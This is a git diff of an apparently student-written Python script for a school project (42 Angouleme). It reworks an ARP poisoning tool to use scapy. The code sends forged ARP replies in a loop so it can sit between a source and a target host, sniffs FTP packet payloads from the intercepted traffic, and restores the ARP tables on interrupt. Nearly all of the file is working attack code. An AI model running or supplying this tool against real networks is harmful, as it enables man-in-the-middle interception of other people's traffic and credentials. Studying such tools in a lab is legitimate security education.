@@ -6,21 +6,18 @@
 #    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/06/23 15:42:16 by hubourge          #+#    #+#              #
-#    Updated: 2025/06/24 16:53:56 by hubourge         ###   ########.fr        #
+#    Updated: 2025/06/25 17:00:52 by hubourge         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 import socket
-import struct
 import sys
 import time
 import signal
 import threading
 import netifaces
-from scapy.all import sniff, IP, TCP, Raw
+from scapy.all import sniff, IP, TCP, Raw, ARP, Ether, sendp
 
-ETHERNET_HEADER_FORMAT = "!6s6sH"       # Big Endian (!) Dest MAC (6s), Src MAC (6s), Type ARP (H)
-ARP_HEADER_FORMAT = "!HHBBH6s4s6s4s"    # ARP struct
 poisoning = True
 interface = None
 count = 0
@@ -44,56 +41,26 @@ def parsing():
         sys.exit(1)
 
     return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
-    
-def mac_to_bytes(mac):
-    return bytes.fromhex(mac.replace(":", ""))
 
-def build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, target_mac, target_ip):
-    dest_mac_bytes = mac_to_bytes(dest_mac)
-    src_mac_bytes = mac_to_bytes(src_mac)
-    target_mac_bytes = mac_to_bytes(target_mac)
+def send_arp_reply(src_mac, src_ip, dest_mac, dest_ip):
+    arp_reply = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dest_mac, pdst=dest_ip)
+    ether = Ether(dst=dest_mac, src=src_mac)
+    packet = ether / arp_reply
+    sendp(packet, iface=interface, verbose=False)
 
-    # Header Ethernet [Destination MAC] [Source MAC] [ARP]
-    eth_header = struct.pack(ETHERNET_HEADER_FORMAT, dest_mac_bytes, src_mac_bytes, 0x0806)
-
-    # Header ARP
-    hw_type = 1              # Ethernet
-    proto_type = 0x0800      # IPv4
-    hw_size = 6              # MAC = 6 bytes
-    proto_size = 4           # IP = 4 bytes
-    opcode = 2               # ARP Reply
-
-    arp_header = struct.pack(
-        ARP_HEADER_FORMAT,
-        hw_type,
-        proto_type,
-        hw_size,
-        proto_size,
-        opcode,
-        src_mac_bytes,
-        socket.inet_aton(src_ip),
-        target_mac_bytes,
-        socket.inet_aton(target_ip)
-    )
-
-    return eth_header + arp_header
-
-def restore_arp(sock, src_mac, src_ip, dest_mac, dest_ip):
-    packet = build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, dest_mac, dest_ip)
-    sock.send(packet)
-    
+def restore_arp(src_mac, src_ip, dest_mac, dest_ip):
+    send_arp_reply(src_mac, src_ip, dest_mac, dest_ip)
     time.sleep(1)
-
-    packet = build_arp_packet(dest_mac, dest_ip, src_mac, src_ip, src_mac, src_ip)
-    sock.send(packet)
+    send_arp_reply(dest_mac, dest_ip, src_mac, src_ip)
 
 def handle_sigint(sig, frame):
-        poisoning = False
-        print(f"\n\n  Restore ARP table at {ip_target}")
-        restore_arp(sock, mac_src, ip_src, mac_target, ip_target)
-        print(f"  Restore ARP table at {ip_src}")
-        restore_arp(sock, mac_target, ip_target, mac_src, ip_src)
-        sys.exit(0)
+    global poisoning
+    poisoning = False
+    print(f"\n\n  Restore ARP table at {ip_target}")
+    restore_arp(mac_src, ip_src, mac_target, ip_target)
+    print(f"  Restore ARP table at {ip_src}")
+    restore_arp(mac_target, ip_target, mac_src, ip_src)
+    sys.exit(0)
 
 def ftp_packet_callback(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw):
@@ -120,27 +87,65 @@ def sniff_ftp_traffic():
 
 def resolve_hostname(hostname_or_ip):
     try:
-        return socket.getfqdn(hostname_or_ip)
-    except socket.gaierror:
-        return hostname_or_ip
+        # Try reverse DNS lookup first
+        hostname = socket.gethostbyaddr(hostname_or_ip)[0]
+        return hostname
+    except (socket.gaierror, socket.herror):
+        try:
+            # Fallback to getfqdn
+            return socket.getfqdn(hostname_or_ip)
+        except:
+            return hostname_or_ip
+
+def arp_request_callback(packet):
+    if packet.haslayer(ARP) and packet[ARP].op == 1:  # ARP Request
+        src_ip = packet[ARP].psrc
+        target_ip = packet[ARP].pdst
+        src_hostname = resolve_hostname(src_ip)
+        target_hostname = resolve_hostname(target_ip)
+        packet_length = len(packet[ARP])
+        
+        print(f"  ARP, Request who-has {target_hostname} tell {src_hostname}, length {packet_length}")
+        
+        if target_ip == ip_target:
+            print(f"\n  Target found! Request who-has {target_hostname} tell {src_hostname}")
+            return True
+    return False
+
+def wait_for_arp_request():
+    print("\n  Listening for ARP Request...")
+    
+    sniff(filter="arp", stop_filter=arp_request_callback, store=0, iface=interface, timeout=30)
+
+def arpPoisoning(ip_src, mac_src, ip_target, mac_target):
+    global count
+    
+    wait_for_arp_request()
+    
+    print("\n  Starting ARP poisoning...")
+    while poisoning:
+        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
+        
+        # Send poisoned ARP replies
+        send_arp_reply(mac_target, ip_target, mac_src, ip_src)
+        send_arp_reply(mac_src, ip_src, mac_target, ip_target)
+        
+        count += 1
+        time.sleep(0.2)
 
 def main():
-    global ip_src, mac_src, ip_target, mac_target, count
+    global ip_src, mac_src, ip_target, mac_target, ip_src_str, ip_target_str, interface, poisoning
     ip_src, mac_src, ip_target, mac_target = parsing()
     ip_src_str = resolve_hostname(ip_src)
     ip_target_str = resolve_hostname(ip_target)
 
-    global interface
-    interface = "lo"
-    # interface = getInterface(ip_src) or getInterface(ip_target)
+    interface = getInterface(ip_src) or getInterface(ip_target) or "eth0"
     if not interface:
         print("No network interface found.")
         sys.exit(1)
     print(f"  Using interface: {interface}")
 
-    global poisoning, sock
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    sock.bind((interface, 0))
+    signal.signal(signal.SIGINT, handle_sigint)
 
     print(f"\n  ARP Poisoning Attack")
     print(f"     Source IP:  {ip_src} ({ip_src_str})")
@@ -148,23 +153,11 @@ def main():
     print(f"     Target IP:  {ip_target} ({ip_target_str})")
     print(f"     Target MAC: {mac_target}")
 
-    signal.signal(signal.SIGINT, handle_sigint)
-
     ftp_thread = threading.Thread(target=sniff_ftp_traffic, daemon=True)
     ftp_thread.start()
     time.sleep(2)
 
-    print("\n  Starting ARP poisoning...")
-    while poisoning:
-        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
-        # print(f"  [ARP REPLY] to {ip_src_str} : {ip_target_str} is-at {mac_target} x{count}")
-        pckt1 = build_arp_packet(mac_target, ip_target, mac_src, ip_src, mac_src, ip_src)
-        # print(f"  [ARP REPLY] to {ip_target_str} : {ip_src_str} is-at {mac_src} x{count}")
-        count += 1
-        pckt2 = build_arp_packet(mac_src, ip_src, mac_target, ip_target, mac_target, ip_target)
-        sock.send(pckt1)
-        sock.send(pckt2)
-        time.sleep(0.2)
+    arpPoisoning(ip_src, mac_src, ip_target, mac_target)
 
 if __name__ == "__main__":
     main()
